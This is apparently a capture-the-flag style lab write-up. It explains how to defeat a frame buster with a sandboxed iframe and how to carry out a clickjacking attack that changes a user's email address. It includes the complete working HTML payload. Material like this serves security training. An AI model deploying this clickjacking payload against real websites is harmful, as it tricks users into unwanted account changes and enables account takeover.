# Clickjacking with a frame buster script
* This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and coduct a clickjacking attack that changes the users email address?
	* To solve the lab, crafte some HTML that frames the account page and fools the user into changing their email address by clicking "Click me". The lab is solved when the email address is changed.
	* You can log in to your own account using the following credentials: `wiener:peter`

### 1. Enumerate the web page with _wiener's_ account
* From the _POST /my-account/change-email_, a parameter _email_ is found

![10](https://user-images.githubusercontent.com/53956303/154160985-9a99920f-fa19-43d6-b437-27194d66d546.png)
* And the page where "Update email" button is contanined is found

![15](https://user-images.githubusercontent.com/53956303/154164562-b981a49c-aeb5-4634-b007-3ddfcf414f5b.png)

### 2. Create a malicious HTML to do the clickjacking attack with evade the frame busters
* Make the exploit on the provided Exploit server
	* Use `sandbox="allow-forms"` attribute to netralizes the frame buster script.
```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://ac221f531fc89f45c098374d00cd0098.web-security-academy.net/my-account?email=hacker@pwned.com"></iframe>
```
* Click store and view exploit to see if the div's position is matched to "Update email" button

![11](https://user-images.githubusercontent.com/53956303/154162171-729d694c-c9cd-4bed-9666-46984caef8d2.png)
* Change the value of _top_ in the div to make the position right.
	* when the value of _top_ is set to 450px, the position is adjusted correctly.

![12](https://user-images.githubusercontent.com/53956303/154162289-fd736c31-07b5-4f54-97cc-b1b06a07dbef.png)
### 3. Modify the exploit to trigger the exploit
* change "test me" to "Click me" to be triggered in this lab. Also, change the opacity to 0.0001 to hide the original content behind.

![13](https://user-images.githubusercontent.com/53956303/154164226-b2b93831-682d-4107-8693-3731e7491ba3.png)
* Then, store and click "Deliver exploit to victim" button to deliver the exploit.
	* As a result, the lab is solved.

![14](https://user-images.githubusercontent.com/53956303/154164346-fb7e0b97-0188-4a5c-bd6f-2f19c685c4e1.png)
